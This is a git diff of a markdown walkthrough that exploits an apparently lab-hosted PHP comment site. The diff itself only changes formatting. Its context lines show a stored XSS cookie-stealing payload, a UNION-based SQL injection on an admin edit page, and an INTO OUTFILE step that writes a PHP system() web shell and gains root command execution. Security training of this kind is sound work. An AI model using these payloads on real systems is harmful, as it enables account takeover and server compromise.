@@ -137,9 +137,12 @@ See that error now we know why it's happening so let's move forward ...
 
 We shall see which file is handling those comments and to see that i will intercept with burp ...
 
-<br/>
+<br />
+
 ![](Selection_008.png)
+
 <br/>
+
 File which is handling the comments is ```post_comment.php``` So let's analyse it...
 
 ### post_comment.php
@@ -234,7 +237,9 @@ mysql> select * from comments;
 ```
 We can see the data being stored so let's try to insert some javascript values ```<script>document.cookie</script>```
 <br/>
+
 ![](Selection_009.png)
+
 <br/>
 
 **OUTPUT**
@@ -313,7 +318,9 @@ That the value of ```text``` field is being printed without any filtering so thi
 So, Let's Try to insert a basic xss popup payload...
 
 <br/>
+
 ![](Selection_010.png)
+
 <br/>
 
 So we can do stored xss let's automate this with python and grab cookies :)
@@ -376,8 +383,10 @@ In this function i have done some horrible regex to filter out the cookie and re
 
 But for now we will just login by intercepting the request by burpsuite and changing the cookies...
 
-<br/>
+<br />
+
 ![](Selection_011.png)
+
 <br />
 
 Now that we have logged in as admin and we are at ```http://192.168.0.5/admin/index.php``` page so let's look into the source code of pages inside the ```admin``` directory one by one...
@@ -432,8 +441,11 @@ function find($id) {
 Aha! here we can see that the user input(id) variable is being directly passed without any checks or validiation so there has to be a sql injection on this...Let's try :)
 
 <br/>
+
 ![](Selection_012.png)
+
 <br/>
+
 
 ```
 URL:-http://192.168.0.5/admin/edit.php?id=-1%20union%20select%201,%22we%20got%20it%20boys%22,3,4%23
@@ -472,7 +484,9 @@ So first we shall construct our basic payload to write a file in css directory..
 Code:-union select 1,"hello sarthak",3,4 into outfile "/var/www/css/lol.php"%23
 ```
 <br/>
+
 ![](Selection_013.png)
+
 <br/>
 
 **OUTPUT**
@@ -494,7 +508,9 @@ PAYLOAD:-union select "<?php","system($_GET['c']);","?>",";" into outfile "/var/
 This would do our work hehe :)
 
 <br/>
+
 ![](Selection_014.png)
+
 <br/>
 
 
@@ -511,7 +527,9 @@ root@debian:/var/www/css#
 
 ### RCE achieved 
 <br/>
+
 ![](Selection_015.png)
+
 <br/>
 
 And yes finally we got rce so let's try to update our script and automate everything upto shell...
